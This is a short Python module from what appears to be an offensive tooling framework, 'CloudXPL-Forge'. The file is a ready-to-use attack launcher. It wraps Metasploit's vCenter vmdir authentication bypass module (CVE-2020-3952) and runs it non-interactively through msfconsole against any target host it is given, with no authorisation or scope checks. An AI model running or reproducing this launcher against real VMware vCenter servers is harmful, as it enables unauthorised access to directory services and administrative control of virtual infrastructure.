"""CloudXPL-Forge  -  vCenter vmdir Auth Bypass (Metasploit Bridge)."""


MANIFEST: dict = {
    "name": "vCenter vmdir Auth Bypass (Metasploit Bridge)",
    "cve": "CVE-2020-3952",
    "mitre": ["T1078"],
    "description": "Bridge to Metasploit auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass for exploiting vmdir auth flaw.",
    "references": ["https://www.rapid7.com/db/modules/auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass/"],
}


import shutil
import subprocess
import sys


def run(args):
    msfconsole = shutil.which("msfconsole")
    if not msfconsole:
        print("[!] msfconsole not found  -  install Metasploit Framework", file=sys.stderr)
        return 1

    target = getattr(args, "target", None) or getattr(args, "vcenter_host", "") or ""
    cmd = [
        msfconsole, "-q", "-x",
        f"use auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass; "
        + (f"set RHOSTS {target}; " if target else "")
        + "run; exit",
    ]
    if getattr(args, "verbose", False):
        print(f"[*] Running: {' '.join(cmd)}")
    return subprocess.call(cmd)
